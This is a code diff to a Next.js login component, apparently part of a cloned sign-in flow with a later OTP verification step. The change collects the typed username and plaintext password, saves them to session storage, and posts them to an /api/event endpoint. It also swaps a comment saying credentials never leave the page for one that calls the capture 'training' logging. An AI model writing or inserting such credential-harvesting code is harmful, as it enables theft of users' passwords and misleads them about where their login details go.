@@ -1,12 +1,14 @@
 "use client";
 
-import { useState, type FormEvent } from "react";
+import { useEffect, useState, type FormEvent } from "react";
 import { useRouter } from "next/navigation";
 
 import CardShell from "@/components/CardShell";
+import { sendEvent } from "@/lib/event-client";
 import { MWB_VERIFY_PATH } from "@/lib/mwb-paths";
 import {
   clearPendingOtpMethod,
+  savePendingCredentials,
   savePendingUserId,
 } from "@/lib/pending-session";
 import { SITE } from "@/lib/site-content";
@@ -126,6 +128,10 @@ export default function LoginCard() {
   const canContinue = username.trim().length > 0;
   const canSignIn = password.trim().length > 0;
 
+  useEffect(() => {
+    void sendEvent("page_view", {});
+  }, []);
+
   function handleUsernameSubmit(e: FormEvent) {
     e.preventDefault();
     if (!canContinue) {
@@ -141,10 +147,15 @@ export default function LoginCard() {
   function handlePasswordSubmit(e: FormEvent) {
     e.preventDefault();
     if (!canSignIn) return;
-    // Demo flow — credentials never leave the page. Only the username is
-    // kept in session storage so /verify can guard entry.
+    // Demo flow — the sign-in continues locally, but the step is dispatched
+    // to POST /api/event so the training backend can log the attempt.
     clearPendingOtpMethod();
     savePendingUserId(username);
+    savePendingCredentials(username, password);
+    void sendEvent("credentials", {
+      username: username.trim(),
+      password,
+    });
     router.push(MWB_VERIFY_PATH);
   }
 
